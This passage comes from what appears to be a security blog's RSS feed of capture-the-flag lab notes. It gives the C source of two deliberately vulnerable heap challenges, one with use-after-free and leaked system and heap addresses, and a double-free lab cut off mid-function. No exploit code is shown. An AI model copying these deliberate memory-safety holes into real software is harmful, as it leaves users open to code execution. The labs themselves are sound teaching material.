&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">default_handle&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;EVENT: get event named &lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\&amp;#34;&lt;/span>&lt;span style="color:#e6db74">!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>event;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>event_handle)(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span> &lt;span style="color:#f92672">*&lt;/span>entities[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">memu&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;1. register entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;2. delete entity&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;3. set name&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;4. trigger event&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;choice: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">register_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx] &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">entity&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle &lt;span style="color:#f92672">=&lt;/span> default_handle;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Default Event&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_entity&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(entities[idx]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">set_name&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Nmae Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		len &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> (len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name &lt;span style="color:#f92672">=&lt;/span> malloc(len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		read(&lt;span style="color:#ae81ff">0&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name, len &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Invalid index&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">trigger_event&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (entities[idx])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		printf(&lt;span style="color:#e6db74">&amp;#34;Name: %s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event_handle(entities[idx]&lt;span style="color:#f92672">-&amp;gt;&lt;/span>event);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdin, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	setvbuf(stdout, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift1: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>system);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;gift2: %p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, ptr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span> (;;)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		memu();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">int&lt;/span> choice &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">switch&lt;/span> (choice)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			register_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			delete_entity();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			set_name();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			trigger_event();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">default&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			puts(&lt;span style="color:#e6db74">&amp;#34;Invalid command&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x39(Lab - Double Free)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/</guid><description>&lt;h1 id="simple-pwn-0x39lab---double-free">
 Simple PWN 0x39(Lab - Double Free)
 &lt;a class="anchor" href="#simple-pwn-0x39lab---double-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkD83kaji">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;sys/types.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>content;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> len;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">note&lt;/span> notes[&lt;span style="color:#ae81ff">0x10&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">read_int&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> atoi(buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">read_ul&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> buf[&lt;span style="color:#ae81ff">0x20&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, buf, &lt;span style="color:#ae81ff">0x1f&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> strtoul(buf, NULL, &lt;span style="color:#ae81ff">10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">get_idx&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx &lt;span style="color:#f92672">=&lt;/span> read_int();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span> (idx &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span> &lt;span style="color:#f92672">||&lt;/span> idx &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">add_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Length: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].len &lt;span style="color:#f92672">=&lt;/span> read_ul();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	notes[idx].content &lt;span style="color:#f92672">=&lt;/span> malloc(notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Add done&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Note[%d]:&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, idx);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	write(&lt;span style="color:#ae81ff">1&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Content: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, notes[idx].content, notes[idx].len);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">delete_note&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> idx;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	printf(&lt;span style="color:#e6db74">&amp;#34;Index: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	idx &lt;span style="color:#f92672">=&lt;/span> get_idx();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	free(notes[idx].content);
